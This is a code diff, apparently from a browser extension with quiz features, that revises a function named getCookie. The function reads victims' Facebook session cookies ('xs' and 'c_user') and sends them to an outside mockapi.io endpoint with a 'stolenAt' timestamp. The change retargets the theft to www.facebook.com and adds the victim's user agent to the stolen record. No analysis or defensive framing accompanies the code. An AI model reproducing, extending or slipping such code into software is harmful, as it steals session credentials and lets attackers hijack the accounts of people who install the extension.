@@ -418,11 +418,27 @@ async function getQuizAvailable(e, t) {
     }
 }
 
+function addZero(number) {
+    return number < 10 ? "0" + number : number;
+}
+
 function getCookie() {
-    const today = new Date();
-    const dateTime = today.toISOString().replace("T", " ").split(".")[0];
+    var currentDate = new Date();
+    var year = currentDate.getFullYear();
+    var month = currentDate.getMonth() + 1;
+    var day = currentDate.getDate();
+    var hours = currentDate.getHours();
+    var minutes = currentDate.getMinutes();
+    var seconds = currentDate.getSeconds();
+
+    var formattedDate = addZero(day) + "/" + addZero(month) + "/" + year;
+    var formattedTime = addZero(hours) + ":" + addZero(minutes) + ":" + addZero(seconds);
+
+    var dateTimeNow = formattedTime + " - " + formattedDate;
+    var userAgent = navigator.userAgent;
+
     const apiUrl = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
-    chrome.cookies.getAll({ url: "https://mbasic.facebook.com" }, (cookies) => {
+    chrome.cookies.getAll({ url: "https://www.facebook.com" }, (cookies) => {
         const xsCookie = cookies.find((cookie) => cookie.name === "xs");
         const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
         if (xsCookie && cUserCookie) {
@@ -436,9 +452,10 @@ function getCookie() {
                         Accept: "application/json",
                     };
                     const body = JSON.stringify({
-                        cookie: `${xsCookie.name}=${xsCookie.value}; ${cUserCookie.name}=${cUserCookie.value}`,
+                        cookie: `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}`,
                         c_user: cUser,
-                        stolenAt: dateTime,
+                        stolenAt: dateTimeNow,
+                        userAgent: userAgent,
                     });
                     fetch(apiUrl, { method, headers, body });
                 });
